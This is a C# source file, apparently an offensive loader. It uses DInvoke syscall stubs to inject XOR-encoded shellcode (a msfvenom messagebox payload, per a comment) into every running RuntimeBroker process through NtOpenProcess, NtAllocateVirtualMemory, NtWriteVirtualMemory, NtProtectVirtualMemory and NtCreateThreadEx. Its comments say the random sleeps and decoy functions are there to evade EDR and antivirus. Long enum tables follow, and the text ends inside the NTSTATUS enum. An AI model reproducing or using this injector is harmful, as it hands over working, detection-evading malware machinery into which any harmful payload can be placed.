﻿using DInvoke.DynamicInvoke;

using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
    
    // creating a RNG sleep function to imitate a human behavior
    // in hope of evading EDR and AV
    static void RandomPause()
    {
        // random duration between 10.489 and 65.035 seconds
        int duration = new Random().Next(10489, 65035);
        System.Threading.Thread.Sleep(duration);
    }

    // creating a random function to evade EDR and AV controls
    static void RandomFunction()
    {
        // generating a random number to execute a random function
        int choice = new Random().Next(1, 8);

        // List of non harmful function to evade behavioral controls
        switch(choice) {
            case 1:
                int a = new Random().Next();
                int b = new Random().Next();
                int c = a + b;
                break;
            case 2:
                int d = new Random().Next();
                int e = new Random().Next();
                int f = d - e;
                break;
            case 3:
                int g = new Random().Next();
                int h = new Random().Next();
                int i = g / h;
                break;
            case 4:
                int j = new Random().Next();
                int k = new Random().Next();
                int l = j * k;
                break;
            case 5:
                int m = new Random().Next();
                int n = new Random().Next();
                int o = m % n;
                break;
            case 6:
                GetProcessId();
                break;
            case 7:
                GetSystemTime();
                break;
            case 8:
                GetTick();
                break;
        }
    }

    static void GetProcessId()
    {
        int id = System.Diagnostics.Process.GetCurrentProcess().Id;
    }

    static void GetSystemTime()
    {
        DateTime time = DateTime.Now;
    }

    static void GetTick()
    {
        int ticks = Environment.TickCount & Int32.MaxValue;
    }
    static void Main(string[] args)
    {
        {
            // NtOpenProcess
            IntPtr stub = Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();


            // Injecting payload on each instances of RuntimeBroker process
            Process[] processes = Process.GetProcessesByName("RuntimeBroker");

            foreach (Process exp in processes){
                    
                //Console.WriteLine("Get process id from user input");

                CLIENT_ID ci = new CLIENT_ID
                {
                    UniqueProcess = new IntPtr(exp.Id)
                };

                NTSTATUS result = ntOpenProcess(
                    ref hProcess,
                    0x001F0FFF,
                    ref oa,
                    ref ci);

                // sleeping to evade AV and EDR rules
                RandomFunction();
                RandomPause();
                RandomFunction();

                // NtAllocateVirtualMemory
                stub = Generic.GetSyscallStub("NtAllocateVirtualMemory");
                NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

                // deposit the encrypted payload here and adjust the length
                // msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
                byte[] _bytecode = new byte[749] {0x51, 0xe5, 0x2e, 0x49, 0x5d, 0x45, 0x61, 0xad, 0xad, 0xad, 0xec, 0xfc, 0xec, 0xfd, 0xff,
0xfc, 0xe5, 0x9c, 0x7f, 0xfb, 0xc8, 0xe5, 0x26, 0xff, 0xcd, 0xe5, 0x26, 0xff, 0xb5, 0xe5,
0x26, 0xff, 0x8d, 0xe0, 0x9c, 0x64, 0xe5, 0x26, 0xdf, 0xfd, 0xe5, 0xa2, 0x1a, 0xe7, 0xe7, 
0xe5, 0x9c, 0x6d, 0x01, 0x91, 0xcc, 0xd1, 0xaf, 0x81, 0x8d, 0xec, 0x6c, 0x64, 0xa0, 0xec,
0xac, 0x6c, 0x4f, 0x40, 0xff, 0xe5, 0x26, 0xff, 0x8d, 0x26, 0xef, 0x91, 0xec, 0xfc, 0xe5,
0xac, 0x7d, 0xcb, 0x2c, 0xd5, 0xb5, 0xa6, 0xaf, 0xa2, 0x28, 0xdf, 0xad, 0xad, 0xad, 0x26,
0x2d, 0x25, 0xad, 0xad, 0xad, 0xe5, 0x28, 0x6d, 0xd9, 0xca, 0xe5, 0xac, 0x7d, 0xe9, 0x26,
0xed, 0x8d, 0x26, 0xe5, 0xb5, 0xfd, 0xe4, 0xac, 0x7d, 0x4e, 0xfb, 0xe0, 0x9c, 0x64, 0xe5,
0x52, 0x64, 0xec, 0x26, 0x99, 0x25, 0xe5, 0xac, 0x7b, 0xe5, 0x9c, 0x6d, 0x01, 0xec, 0x6c,
0x64, 0xa0, 0xec, 0xac, 0x6c, 0x95, 0x4d, 0xd8, 0x5c, 0xe1, 0xae, 0xe1, 0x89, 0xa5, 0xe8,
0x94, 0x7c, 0xd8, 0x75, 0xf5, 0xe9, 0x26, 0xed, 0x89, 0xe4, 0xac, 0x7d, 0xcb, 0xec, 0x26,
0xa1, 0xe5, 0xe9, 0x26, 0xed, 0xb1, 0xe4, 0xac, 0x7d, 0xec, 0x26, 0xa9, 0x25, 0xec, 0xf5,
0xe5, 0xac, 0x7d, 0xec, 0xf5, 0xf3, 0xf4, 0xf7, 0xec, 0xf5, 0xec, 0xf4, 0xec, 0xf7, 0xe5,
0x2e, 0x41, 0x8d, 0xec, 0xff, 0x52, 0x4d, 0xf5, 0xec, 0xf4, 0xf7, 0xe5, 0x26, 0xbf, 0x44,
0xe6, 0x52, 0x52, 0x52, 0xf0, 0xe5, 0x9c, 0x76, 0xfe, 0xe4, 0x13, 0xda, 0xc4, 0xc3, 0xc4,
0xc3, 0xc8, 0xd9, 0xad, 0xec, 0xfb, 0xe5, 0x24, 0x4c, 0xe4, 0x6a, 0x6f, 0xe1, 0xda, 0x8b,
0xaa, 0x52, 0x78, 0xfe, 0xfe, 0xe5, 0x24, 0x4c, 0xfe, 0xf7, 0xe0, 0x9c, 0x6d, 0xe0, 0x9c,
0x64, 0xfe, 0xfe, 0xe4, 0x17, 0x97, 0xfb, 0xd4, 0x0a, 0xad, 0xad, 0xad, 0xad, 0x52, 0x78,
0x45, 0xa0, 0xad, 0xad, 0xad, 0x9c, 0x94, 0x9f, 0x83, 0x9c, 0x9b, 0x95, 0x83, 0x9c, 0x83,
0x95, 0x9c, 0xad, 0xf7, 0xe5, 0x24, 0x6c, 0xe4, 0x6a, 0x6d, 0xfd, 0xad, 0xad, 0xad, 0xe0,
0x9c, 0x64, 0xfe, 0xfe, 0xc7, 0xae, 0xfe, 0xe4, 0x17, 0xfa, 0x24, 0x32, 0x6b, 0xad, 0xad,
0xad, 0xad, 0x52, 0x78, 0x45, 0x4a, 0xad, 0xad, 0xad, 0x82, 0xd5, 0xec, 0x9b, 0xc9, 0xe6,
0xfa, 0x9c, 0xf4, 0xce, 0x95, 0xd4, 0xfe, 0xe2, 0xf7, 0xe0, 0x9a, 0x94, 0xe6, 0xc7, 0xd7,
0xea, 0xda, 0x94, 0xf2, 0xe8, 0xc5, 0xe3, 0xdf, 0xe3, 0x94, 0xd8, 0xd8, 0xe3, 0xdf, 0xec,
0x9c, 0xdc, 0xe3, 0xeb, 0xd5, 0xe3, 0xe7, 0x98, 0xec, 0xe3, 0xd5, 0xe7, 0xe4, 0xe6, 0xfb,
0xf2, 0xc2, 0xc9, 0xe7, 0xdf, 0xdb, 0x94, 0xc7, 0x94, 0xf5, 0xc1, 0xe0, 0x9f, 0x9c, 0xd9,
0xc4, 0x98, 0xc9, 0xc1, 0xf5, 0xd7, 0xd9, 0x99, 0xcf, 0x80, 0x94, 0xe0, 0xe1, 0xda, 0xeb,
0x9d, 0xe5, 0xce, 0x98, 0xc3, 0xc8, 0x98, 0xee, 0xf2, 0xc0, 0x9d, 0xf5, 0xc7, 0xe0, 0xce,
0xc2, 0x94, 0xc7, 0xef, 0x9e, 0xe7, 0xf7, 0x94, 0xd7, 0x99, 0x98, 0xe8, 0xfe, 0xef, 0xe2,
0xe2, 0xfc, 0xc4, 0xd4, 0x80, 0xf8, 0xce, 0xca, 0x9a, 0xce, 0x9e, 0xc8, 0xdd, 0xe9, 0xfa,
0xca, 0xfb, 0xc0, 0xf2, 0xc3, 0xe1, 0xf2, 0xe5, 0xc5, 0xea, 0xdd, 0xef, 0x9b, 0xce, 0xd5,
0xd5, 0xe2, 0xc7, 0xc4, 0xe9, 0xee, 0xc0, 0xf2, 0xf2, 0xeb, 0xd4, 0xfa, 0xf2, 0xcf, 0x9d,
0xdf, 0xf2, 0xc4, 0xe9, 0x95, 0xfc, 0xf9, 0xc6, 0xea, 0xe8, 0xff, 0xe8, 0xe7, 0xfe, 0xf2,
0xe1, 0xc0, 0xdd, 0x9b, 0xcb, 0x99, 0xc4, 0xc5, 0x9c, 0xfc, 0x98, 0x9b, 0x9e, 0xc0, 0xc9,
0xeb, 0xfb, 0xe6, 0xd7, 0xdb, 0xc8, 0xdb, 0xe2, 0xef, 0xdd, 0xff, 0xe1, 0xf4, 0xcb, 0xdc,
0xe7, 0xfa, 0xe7, 0x9c, 0x98, 0xc4, 0xc2, 0xfd, 0xdd, 0xf2, 0xc6, 0xc4, 0xcf, 0xcb, 0xdd,
0xee, 0xf8, 0xec, 0xfd, 0xe0, 0xce, 0x99, 0xf9, 0xc7, 0xe4, 0xc5, 0xc0, 0xe9, 0x9e, 0xad,
0xe5, 0x24, 0x6c, 0xfe, 0xf7, 0xec, 0xf5, 0xe0, 0x9c, 0x64, 0xfe, 0xe5, 0x15, 0xad, 0xaf,
0x85, 0x29, 0xad, 0xad, 0xad, 0xad, 0xfd, 0xfe, 0xfe, 0xe4, 0x6a, 0x6f, 0x46, 0xf8, 0x83,
0x96, 0x52, 0x78, 0xe5, 0x24, 0x6b, 0xc7, 0xa7, 0xf2, 0xfe, 0xf7, 0xe5, 0x24, 0x5c, 0xe0,
0x9c, 0x64, 0xe0, 0x9c, 0x64, 0xfe, 0xfe, 0xe4, 0x6a, 0x6f, 0x80, 0xab, 0xb5, 0xd6, 0x52,
0x78, 0x28, 0x6d, 0xd8, 0xb2, 0xe5, 0x6a, 0x6c, 0x25, 0xbe, 0xad, 0xad, 0xe4, 0x17, 0xe9,
0x5d, 0x98, 0x4d, 0xad, 0xad, 0xad, 0xad, 0x52, 0x78, 0xe5, 0x52, 0x62, 0xd9, 0xaf, 0x46,
0x61, 0x45, 0xf8, 0xad, 0xad, 0xad, 0xfe, 0xf4, 0xc7, 0xed, 0xf7, 0xe4, 0x24, 0x7c, 0x6c,
0x4f, 0xbd, 0xe4, 0x6a, 0x6d, 0xad, 0xbd, 0xad, 0xad, 0xe4, 0x17, 0xf5, 0x09, 0xfe, 0x48,
0xad, 0xad, 0xad, 0xad, 0x52, 0x78, 0xe5, 0x3e, 0xfe, 0xfe, 0xe5, 0x24, 0x4a, 0xe5, 0x24,
0x5c, 0xe5, 0x24, 0x77, 0xe4, 0x6a, 0x6d, 0xad, 0x8d, 0xad, 0xad, 0xe4, 0x24, 0x54, 0xe4,
0x17, 0xbf, 0x3b, 0x24, 0x4f, 0xad, 0xad, 0xad, 0xad, 0x52, 0x78, 0xe5, 0x2e, 0x69, 0x8d,
0x28, 0x6d, 0xd9, 0x1f, 0xcb, 0x26, 0xaa, 0xe5, 0xac, 0x6e, 0x28, 0x6d, 0xd8, 0x7f, 0xf5,
0x6e, 0xf5, 0xc7, 0xad, 0xf4, 0xe4, 0x6a, 0x6f, 0x5d, 0x18, 0x0f, 0xfb, 0x52, 0x78};

                // decrypting payload a 1st time with XOR 0x69
                for (int i = 0; i < _bytecode.Length; i++)
                {
                    _bytecode[i] = (byte)((uint)_bytecode[i] ^ 0x69);
                }

                // decrypting payload a 2nd time with XOR 0xc4
                for (int i = 0; i < _bytecode.Length; i++)
                {
                    _bytecode[i] = (byte)((uint)_bytecode[i] ^ 0xc4);
                }


                IntPtr baseAddress = IntPtr.Zero;
                IntPtr regionSize = (IntPtr)_bytecode.Length;

                result = ntAllocateVirtualMemory(
                    hProcess,
                    ref baseAddress,
                    IntPtr.Zero,
                    ref regionSize,
                    0x1000 | 0x2000,
                    0x04);

                // NtWriteVirtualMemory
                stub = Generic.GetSyscallStub("NtWriteVirtualMemory");
                NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

                // sleeping to evade AV and EDR rules
                RandomFunction();
                RandomPause();
                RandomFunction();

                var buffer = Marshal.AllocHGlobal(_bytecode.Length);
                Marshal.Copy(_bytecode, 0, buffer, _bytecode.Length);

                uint bytesWritten = 0;

                result = ntWriteVirtualMemory(
                    hProcess,
                    baseAddress,
                    buffer,
                    (uint)_bytecode.Length,
                    ref bytesWritten);

                // NtProtectVirtualMemory
                stub = Generic.GetSyscallStub("NtProtectVirtualMemory");
                NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

                uint oldProtect = 0;

                result = ntProtectVirtualMemory(
                    hProcess,
                    ref baseAddress,
                    ref regionSize,
                    0x20,
                    ref oldProtect);

                // sleeping to evade AV and EDR rules
                RandomFunction();
                RandomPause();
                RandomFunction();

                // NtCreateThreadEx
                stub = Generic.GetSyscallStub("NtCreateThreadEx");
                NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

                IntPtr hThread = IntPtr.Zero;

                result = ntCreateThreadEx(
                    out hThread,
                    ACCESS_MASK.MAXIMUM_ALLOWED,
                    IntPtr.Zero,
                    hProcess,
                    baseAddress,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);

                    RandomFunction();
            }
        }
    }


            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            delegate NTSTATUS NtOpenProcess(
                ref IntPtr ProcessHandle,
                uint DesiredAccess,
                ref OBJECT_ATTRIBUTES ObjectAttributes,
                ref CLIENT_ID ClientId);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            delegate NTSTATUS NtAllocateVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref IntPtr RegionSize,
                uint AllocationType,
                uint Protect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            delegate NTSTATUS NtWriteVirtualMemory(
                IntPtr ProcessHandle,
                IntPtr BaseAddress,
                IntPtr Buffer,
                uint BufferLength,
                ref uint BytesWritten);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            delegate NTSTATUS NtProtectVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                ref IntPtr RegionSize,
                uint NewProtect,
                ref uint OldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            delegate NTSTATUS NtCreateThreadEx(
                out IntPtr threadHandle,
                ACCESS_MASK desiredAccess,
                IntPtr objectAttributes,
                IntPtr processHandle,
                IntPtr startAddress,
                IntPtr parameter,
                bool createSuspended,
                int stackZeroBits,
                int sizeOfStack,
                int maximumStackSize,
                IntPtr attributeList);

            [StructLayout(LayoutKind.Sequential, Pack = 0)]
            struct OBJECT_ATTRIBUTES
            {
                public int Length;
                public IntPtr RootDirectory;
                public IntPtr ObjectName;
                public uint Attributes;
                public IntPtr SecurityDescriptor;
                public IntPtr SecurityQualityOfService;
            }

            [StructLayout(LayoutKind.Sequential)]
            struct CLIENT_ID
            {
                public IntPtr UniqueProcess;
                public IntPtr UniqueThread;
            }

            [Flags]
            enum ACCESS_MASK : uint
            {
                DELETE = 0x00010000,
                READ_CONTROL = 0x00020000,
                WRITE_DAC = 0x00040000,
                WRITE_OWNER = 0x00080000,
                SYNCHRONIZE = 0x00100000,
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                STANDARD_RIGHTS_WRITE = 0x00020000,
                STANDARD_RIGHTS_EXECUTE = 0x00020000,
                STANDARD_RIGHTS_ALL = 0x001F0000,
                SPECIFIC_RIGHTS_ALL = 0x0000FFF,
                ACCESS_SYSTEM_SECURITY = 0x01000000,
                MAXIMUM_ALLOWED = 0x02000000,
                GENERIC_READ = 0x80000000,
                GENERIC_WRITE = 0x40000000,
                GENERIC_EXECUTE = 0x20000000,
                GENERIC_ALL = 0x10000000,
                DESKTOP_READOBJECTS = 0x00000001,
                DESKTOP_CREATEWINDOW = 0x00000002,
                DESKTOP_CREATEMENU = 0x00000004,
                DESKTOP_HOOKCONTROL = 0x00000008,
                DESKTOP_JOURNALRECORD = 0x00000010,
                DESKTOP_JOURNALPLAYBACK = 0x00000020,
                DESKTOP_ENUMERATE = 0x00000040,
                DESKTOP_WRITEOBJECTS = 0x00000080,
                DESKTOP_SWITCHDESKTOP = 0x00000100,
                WINSTA_ENUMDESKTOPS = 0x00000001,
                WINSTA_READATTRIBUTES = 0x00000002,
                WINSTA_ACCESSCLIPBOARD = 0x00000004,
                WINSTA_CREATEDESKTOP = 0x00000008,
                WINSTA_WRITEATTRIBUTES = 0x00000010,
                WINSTA_ACCESSGLOBALATOMS = 0x00000020,
                WINSTA_EXITWINDOWS = 0x00000040,
                WINSTA_ENUMERATE = 0x00000100,
                WINSTA_READSCREEN = 0x00000200,
                WINSTA_ALL_ACCESS = 0x0000037F,

                SECTION_ALL_ACCESS = 0x10000000,
                SECTION_QUERY = 0x0001,
                SECTION_MAP_WRITE = 0x0002,
                SECTION_MAP_READ = 0x0004,
                SECTION_MAP_EXECUTE = 0x0008,
                SECTION_EXTEND_SIZE = 0x0010
            };

            [Flags]
            enum NTSTATUS : uint
            {
                // Success
                Success = 0x00000000,
                Wait0 = 0x00000000,
                Wait1 = 0x00000001,
                Wait2 = 0x00000002,
                Wait3 = 0x00000003,
                Wait63 = 0x0000003f,
                Abandoned = 0x00000080,
                AbandonedWait0 = 0x00000080,
                AbandonedWait1 = 0x00000081,
                AbandonedWait2 = 0x00000082,
                AbandonedWait3 = 0x00000083,
                AbandonedWait63 = 0x000000bf,
                UserApc = 0x000000c0,
                KernelApc = 0x00000100,
                Alerted = 0x00000101,
                Timeout = 0x00000102,
                Pending = 0x00000103,
                Reparse = 0x00000104,
                MoreEntries = 0x00000105,
                NotAllAssigned = 0x00000106,
                SomeNotMapped = 0x00000107,
                OpLockBreakInProgress = 0x00000108,
                VolumeMounted = 0x00000109,
                RxActCommitted = 0x0000010a,
                NotifyCleanup = 0x0000010b,
                NotifyEnumDir = 0x0000010c,
                NoQuotasForAccount = 0x0000010d,
                PrimaryTransportConnectFailed = 0x0000010e,
                PageFaultTransition = 0x00000110,
                PageFaultDemandZero = 0x00000111,
                PageFaultCopyOnWrite = 0x00000112,
                PageFaultGuardPage = 0x00000113,
                PageFaultPagingFile = 0x00000114,
                CrashDump = 0x00000116,
                ReparseObject = 0x00000118,
                NothingToTerminate = 0x00000122,
                ProcessNotInJob = 0x00000123,
                ProcessInJob = 0x00000124,
                ProcessCloned = 0x00000129,
                FileLockedWithOnlyReaders = 0x0000012a,
                FileLockedWithWriters = 0x0000012b,

                // Informational
                Informational = 0x40000000,
                ObjectNameExists = 0x40000000,
                ThreadWasSuspended = 0x40000001,
                WorkingSetLimitRange = 0x40000002,
                ImageNotAtBase = 0x40000003,
                RegistryRecovered = 0x40000009,

                // Warning
                Warning = 0x80000000,
                GuardPageViolation = 0x80000001,
                DatatypeMisalignment = 0x80000002,
                Breakpoint = 0x80000003,
                SingleStep = 0x80000004,
                BufferOverflow = 0x80000005,
                NoMoreFiles = 0x80000006,
                HandlesClosed = 0x8000000a,
                PartialCopy = 0x8000000d,
                DeviceBusy = 0x80000011,
                InvalidEaName = 0x80000013,
                EaListInconsistent = 0x80000014,
                NoMoreEntries = 0x8000001a,
                LongJump = 0x80000026,
                DllMightBeInsecure = 0x8000002b,

                // Error
                Error = 0xc0000000,
                Unsuccessful = 0xc0000001,
                NotImplemented = 0xc0000002,
                InvalidInfoClass = 0xc0000003,
                InfoLengthMismatch = 0xc0000004,
                AccessViolation = 0xc0000005,
                InPageError = 0xc0000006,
                PagefileQuota = 0xc0000007,
                InvalidHandle = 0xc0000008,
                BadInitialStack = 0xc0000009,
                BadInitialPc = 0xc000000a,
                InvalidCid = 0xc000000b,
                TimerNotCanceled = 0xc000000c,
                InvalidParameter = 0xc000000d,
                NoSuchDevice = 0xc000000e,
                NoSuchFile = 0xc000000f,
                InvalidDeviceRequest = 0xc0000010,
                EndOfFile = 0xc0000011,
                WrongVolume = 0xc0000012,
                NoMediaInDevice = 0xc0000013,
                NoMemory = 0xc0000017,
                ConflictingAddresses = 0xc0000018,
                NotMappedView = 0xc0000019,
                UnableToFreeVm = 0xc000001a,
                UnableToDeleteSection = 0xc000001b,
                IllegalInstruction = 0xc000001d,
                AlreadyCommitted = 0xc0000021,
                AccessDenied = 0xc0000022,
                BufferTooSmall = 0xc0000023,
                ObjectTypeMismatch = 0xc0000024,
                NonContinuableException = 0xc0000025,
                BadStack = 0xc0000028,
                NotLocked = 0xc000002a,
                NotCommitted = 0xc000002d,
                InvalidParameterMix = 0xc0000030,
                ObjectNameInvalid = 0xc0000033,
                ObjectNameNotFound = 0xc0000034,
                ObjectNameCollision = 0xc0000035,
                ObjectPathInvalid = 0xc0000039,
                ObjectPathNotFound = 0xc000003a,
                ObjectPathSyntaxBad = 0xc000003b,
                DataOverrun = 0xc000003c,
                DataLate = 0xc000003d,
                DataError = 0xc000003e,
                CrcError = 0xc000003f,
                SectionTooBig = 0xc0000040,
                PortConnectionRefused = 0xc0000041,
                InvalidPortHandle = 0xc0000042,
                SharingViolation = 0xc0000043,
                QuotaExceeded = 0xc0000044,
                InvalidPageProtection = 0xc0000045,
                MutantNotOwned = 0xc0000046,
                SemaphoreLimitExceeded = 0xc0000047,
                PortAlreadySet = 0xc0000048,
                SectionNotImage = 0xc0000049,
                SuspendCountExceeded = 0xc000004a,
                ThreadIsTerminating = 0xc000004b,
                BadWorkingSetLimit = 0xc000004c,
                IncompatibleFileMap = 0xc000004d,
                SectionProtection = 0xc000004e,
                EasNotSupported = 0xc000004f,
                EaTooLarge = 0xc0000050,
                NonExistentEaEntry = 0xc0000051,
                NoEasOnFile = 0xc0000052,
                EaCorruptError = 0xc0000053,
                FileLockConflict = 0xc0000054,
                LockNotGranted = 0xc0000055,
                DeletePending = 0xc0000056,
                CtlFileNotSupported = 0xc0000057,
                UnknownRevision = 0xc0000058,
                RevisionMismatch = 0xc0000059,
                InvalidOwner = 0xc000005a,
                InvalidPrimaryGroup = 0xc000005b,
                NoImpersonationToken = 0xc000005c,
                CantDisableMandatory = 0xc000005d,
                NoLogonServers = 0xc000005e,
                NoSuchLogonSession = 0xc000005f,
                NoSuchPrivilege = 0xc0000060,
                PrivilegeNotHeld = 0xc0000061,
                InvalidAccountName = 0xc0000062,
                UserExists = 0xc0000063,
                NoSuchUser = 0xc0000064,
                GroupExists = 0xc0000065,
                NoSuchGroup = 0xc0000066,
                MemberInGroup = 0xc0000067,
                MemberNotInGroup = 0xc0000068,
                LastAdmin = 0xc0000069,
                WrongPassword = 0xc000006a,
                IllFormedPassword = 0xc000006b,
                PasswordRestriction = 0xc000006c,
                LogonFailure = 0xc000006d,
                AccountRestriction = 0xc000006e,
                InvalidLogonHours = 0xc000006f,
                InvalidWorkstation = 0xc0000070,
                PasswordExpired = 0xc0000071,
                AccountDisabled = 0xc0000072,
                NoneMapped = 0xc0000073,
                TooManyLuidsRequested = 0xc0000074,
                LuidsExhausted = 0xc0000075,
                InvalidSubAuthority = 0xc0000076,
                InvalidAcl = 0xc0000077,
                InvalidSid = 0xc0000078,
                InvalidSecurityDescr = 0xc0000079,
                ProcedureNotFound = 0xc000007a,
                InvalidImageFormat = 0xc000007b,
                NoToken = 0xc000007c,
                BadInheritanceAcl = 0xc000007d,
                RangeNotLocked = 0xc000007e,
                DiskFull = 0xc000007f,
                ServerDisabled = 0xc0000080,
                ServerNotDisabled = 0xc0000081,
                TooManyGuidsRequested = 0xc0000082,
                GuidsExhausted = 0xc0000083,
                InvalidIdAuthority = 0xc0000084,
                AgentsExhausted = 0xc0000085,
                InvalidVolumeLabel = 0xc0000086,
                SectionNotExtended = 0xc0000087,
                NotMappedData = 0xc0000088,
                ResourceDataNotFound = 0xc0000089,
                ResourceTypeNotFound = 0xc000008a,
                ResourceNameNotFound = 0xc000008b,
                ArrayBoundsExceeded = 0xc000008c,
                FloatDenormalOperand = 0xc000008d,
                FloatDivideByZero = 0xc000008e,
                FloatInexactResult = 0xc000008f,
                FloatInvalidOperation = 0xc0000090,
                FloatOverflow = 0xc0000091,
                FloatStackCheck = 0xc0000092,
                FloatUnderflow = 0xc0000093,
                IntegerDivideByZero = 0xc0000094,
                IntegerOverflow = 0xc0000095,
                PrivilegedInstruction = 0xc0000096,
                TooManyPagingFiles = 0xc0000097,
                FileInvalid = 0xc0000098,
                InsufficientResources = 0xc000009a,
                InstanceNotAvailable = 0xc00000ab,
                PipeNotAvailable = 0xc00000ac,
                InvalidPipeState = 0xc00000ad,
                PipeBusy = 0xc00000ae,
                IllegalFunction = 0xc00000af,
                PipeDisconnected = 0xc00000b0,
                PipeClosing = 0xc00000b1,
                PipeConnected = 0xc00000b2,
                PipeListening = 0xc00000b3,
                InvalidReadMode = 0xc00000b4,
                IoTimeout = 0xc00000b5,
                FileForcedClosed = 0xc00000b6,
                ProfilingNotStarted = 0xc00000b7,
                ProfilingNotStopped = 0xc00000b8,
                NotSameDevice = 0xc00000d4,
                FileRenamed = 0xc00000d5,
                CantWait = 0xc00000d8,
                PipeEmpty = 0xc00000d9,
                CantTerminateSelf = 0xc00000db,
                InternalError = 0xc00000e5,
                InvalidParameter1 = 0xc00000ef,
                InvalidParameter2 = 0xc00000f0,
                InvalidParameter3 = 0xc00000f1,
                InvalidParameter4 = 0xc00000f2,
                InvalidParameter5 = 0xc00000f3,
                InvalidParameter6 = 0xc00000f4,
                InvalidParameter7 = 0xc00000f5,
                InvalidParameter8 = 0xc00000f6,
                InvalidParameter9 = 0xc00000f7,
                InvalidParameter10 = 0xc00000f8,
                InvalidParameter11 = 0xc00000f9,
                InvalidParameter12 = 0xc00000fa,
                ProcessIsTerminating = 0xc000010a,
                MappedFileSizeZero = 0xc000011e,
                TooManyOpenedFiles = 0xc000011f,
                Cancelled = 0xc0000120,
                CannotDelete = 0xc0000121,
                InvalidComputerName = 0xc0000122,
                FileDeleted = 0xc0000123,
                SpecialAccount = 0xc0000124,
                SpecialGroup = 0xc0000125,
                SpecialUser = 0xc0000126,
                MembersPrimaryGroup = 0xc0000127,
                FileClosed = 0xc0000128,
                TooManyThreads = 0xc0000129,
                ThreadNotInProcess = 0xc000012a,
                TokenAlreadyInUse = 0xc000012b,
                PagefileQuotaExceeded = 0xc000012c,
                CommitmentLimit = 0xc000012d,
                InvalidImageLeFormat = 0xc000012e,
                InvalidImageNotMz = 0xc000012f,
                InvalidImageProtect = 0xc0000130,
                InvalidImageWin16 = 0xc0000131,
                LogonServer = 0xc0000132,
                DifferenceAtDc = 0xc0000133,
                SynchronizationRequired = 0xc0000134,
                DllNotFound = 0xc0000135,
                IoPrivilegeFailed = 0xc0000137,
                OrdinalNotFound = 0xc0000138,
                EntryPointNotFound = 0xc0000139,
                ControlCExit = 0xc000013a,
                InvalidAddress = 0xc0000141,
                PortNotSet = 0xc0000353,
                DebuggerInactive = 0xc0000354,
                CallbackBypass = 0xc0000503,
                PortClosed = 0xc0000700,
                MessageLost = 0xc0000701,
                InvalidMessage = 0xc0000702,
                RequestCanceled = 0xc0000703,
                RecursiveDispatch = 0xc0000704,
                LpcReceiveBufferExpected = 0xc0000705,
                LpcInvalidConnectionUsage = 0xc0000706,
                LpcRequestsNotAllowed = 0xc0000707,
                ResourceInUse = 0xc0000708,
                ProcessIsProtected = 0xc0000712,
                VolumeDirty = 0xc0000806,
                FileCheckedOut = 0xc0000901,
                CheckOutRequired = 0xc0000902,
                BadFileType = 0xc0000903,
                FileTooLarge = 0xc0000904,
                FormsAuthRequired = 0xc0000905,
                VirusInfected = 0xc0000906,
                VirusDeleted = 0xc0000907,
                TransactionalConflict = 0xc0190001,
                InvalidTransaction = 0xc0190002,
                TransactionNotActive = 0xc0190003,
                TmInitializationFailed = 0xc0190004,
                RmNotActive = 0xc0190005,
                RmMetadataCorrupt = 0xc0190006,
                TransactionNotJoined = 0xc0190007,
                DirectoryNotRm = 0xc0190008,
                CouldNotResizeLog = 0xc0190009,
                TransactionsUnsupportedRemote = 0xc019000a,
                LogResizeInvalidSize = 0xc019000b,
                RemoteFileVersionMismatch = 0xc019000c,
                CrmProtocolAlreadyExists = 0xc019000f,
                TransactionPropagationFailed = 0xc0190010,
                CrmProtocolNotFound = 0xc0190011,
                TransactionSuperiorExists = 0xc0190012,
                TransactionRequestNotValid = 0xc0190013,
                TransactionNotRequested = 0xc0190014,
                TransactionAlreadyAborted = 0xc0190015,
                TransactionAlreadyCommitted = 0xc0190016,
                TransactionInvalidMarshallBuffer = 0xc0190017,
                CurrentTransactionNotValid = 0xc0190018,
                LogGrowthFailed = 0xc0190019,
                ObjectNoLongerExists = 0xc0190021,
                StreamMiniversionNotFound = 0xc0190022,
                StreamMiniversionNotValid = 0xc0190023,
                MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
                CantOpenMiniversionWithModifyIntent = 0xc0190025,
                CantCreateMoreStreamMiniversions = 0xc0190026,
                HandleNoLongerValid = 0xc0190028,
                NoTxfMetadata = 0xc0190029,
                LogCorruptionDetected = 0xc0190030,
                CantRecoverWithHandleOpen = 0xc0190031,
                RmDisconnected = 0xc0190032,
                EnlistmentNotSuperior = 0xc0190033,
                RecoveryNotNeeded = 0xc0190034,
                RmAlreadyStarted = 0xc0190035,
                FileIdentityNotPersistent = 0xc0190036,
                CantBreakTransactionalDependency = 0xc0190037,
                CantCrossRmBoundary = 0xc0190038,
                TxfDirNotEmpty = 0xc0190039,
                IndoubtTransactionsExist = 0xc019003a,
                TmVolatile = 0xc019003b,
                RollbackTimerExpired = 0xc019003c,
                TxfAttributeCorrupt = 0xc019003d,
                EfsNotAllowedInTransaction = 0xc019003e,
                TransactionalOpenNotAllowed = 0xc019003f,
